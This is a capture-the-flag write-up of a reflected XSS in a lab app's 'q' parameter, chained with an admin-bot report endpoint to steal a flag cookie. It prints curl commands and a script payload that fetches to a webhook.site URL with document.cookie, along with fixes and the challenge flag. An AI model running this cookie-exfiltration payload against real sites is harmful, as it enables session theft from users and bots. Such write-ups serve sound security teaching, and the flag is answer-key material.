# Parrot Reflected XSS Admin Bot Cookie Exfil

## What Is Happening

The Parrot lab lets users record a vocalization sample through the `q` query parameter. The app repeats the input in the transcription section and offers a "send to admin" feature that asks an admin bot to visit a submitted URL.

Because the repeated phrase is reflected as raw HTML, an attacker can host XSS on the same origin and report that URL to the admin bot.

## Why It Happens

The backend inserts `q` directly into the page body. No HTML encoding is applied in the transcription field. The admin bot accepts same-origin URLs through `/api/report` and loads them in a browser session that carries a sensitive cookie:

```text
FLAG=pwnbox{...}
```

That cookie is readable from JavaScript, so a simple fetch exfiltration payload is enough.

## Exact Test

Confirm reflection:

```bash
curl -sS -G "https://d5a6fc460194.pwnbox-lab.com/" \
  --data-urlencode "q=<img src=x onerror=alert(1)>"
```

Build XSS URL:

```text
https://d5a6fc460194.pwnbox-lab.com/?q=<script>fetch('https://webhook.site/[uuid]?c='+encodeURIComponent(document.cookie))</script>
```

Report to admin:

```bash
curl -sS -X POST "https://d5a6fc460194.pwnbox-lab.com/api/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://d5a6fc460194.pwnbox-lab.com/?q=<script>fetch('\''https://webhook.site/[uuid]?c='\''+encodeURIComponent(document.cookie))</script>"}'
```

## Expected Signal

- `q` reflects HTML tags unchanged.
- `/api/report` returns `{"ok":true}` for same-origin URLs.
- External URLs return `The admin only visits this aviary.`
- Webhook receives `FLAG=pwnbox{...}` from the admin browser.

## Result Interpretation

Confirmed bug chain:

```text
Reflected XSS in q
-> same-origin malicious URL
-> admin bot visit
-> JavaScript reads FLAG cookie
-> exfiltration to attacker-controlled webhook
```

## Root Cause

Missing output encoding on reflected user input, plus admin bot URL visitation and a JavaScript-readable flag cookie.

## Impact

- Session or secret cookie theft from the admin bot.
- Potential admin actions if cookies or CSRF protections are weak.
- Same pattern applies to support bots, link preview bots, and moderation crawlers in real apps.

## Fix

- Encode reflected data by output context.
- Use `textContent` or framework-safe rendering.
- Set `HttpOnly` on all sensitive cookies.
- Restrict or sandbox admin bots; avoid browsing user-controlled same-origin pages with privileged cookies.

## Key Lesson

"Admin enjoys repetition" is a strong hint for reflected XSS plus bot reporting. Test the repeated field first, then chain to cookie exfil before trying complex CSP bypasses.

## Flag

`pwnbox{2d7b8f3c4a916e05d2b8c4f7a9e30615}`
